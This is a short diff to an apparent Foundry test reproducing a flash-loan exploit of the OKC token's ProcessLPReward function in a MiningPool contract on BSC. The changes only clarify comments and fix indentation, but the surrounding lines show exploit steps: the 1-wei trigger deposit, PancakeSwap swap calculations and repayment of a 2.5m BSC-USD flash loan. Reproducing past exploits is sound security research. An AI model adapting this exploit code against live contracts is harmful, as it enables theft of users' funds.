@@ -70,7 +70,7 @@ contract OKCProcessLpRewardExploit is Test {
     uint256 attack_uint256_2 = 130000000000000000000000;  // Amount of OKC to SWAP BSD-USD for
 
     function setUp() public {
-        // deposit 1 wei to this contract to trigger the exploit
+        // deposit 1 wei to this contract to trigger the ProcessLPReward() function in the MiningPool contract
         vm.deal(address(this), 1 wei);
 
         bytes memory initCode = type(ExploitHelper).creationCode;
@@ -236,7 +236,7 @@ contract OKCProcessLpRewardExploit is Test {
       path[0] = BSCUSD;
       path[1] = OKC;
 
-		  uint[] memory amountOut = IPancakeRouter01(PANCAKEROUTER).getAmountsOut(attack_uint256_2, path);
+      uint[] memory amountOut = IPancakeRouter01(PANCAKEROUTER).getAmountsOut(attack_uint256_2, path);
       console2.log("Amount of OKC to swap for:", amountOut[1]);
 
       //function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
@@ -333,7 +333,7 @@ contract OKCProcessLpRewardExploit is Test {
         block.timestamp
       );
 
-      // Transfer 2500250000000000000000000 BSC-USD tokens to PANCAKEV3POOL (payback flashloan?) 
+      // Transfer 2500250000000000000000000 BSC-USD tokens to PANCAKEV3POOL paying back the 2.5m flashloan. 
       IERC20(BSCUSD).transfer(PANCAKEV3POOL, 2500250000000000000000000);
     }
 
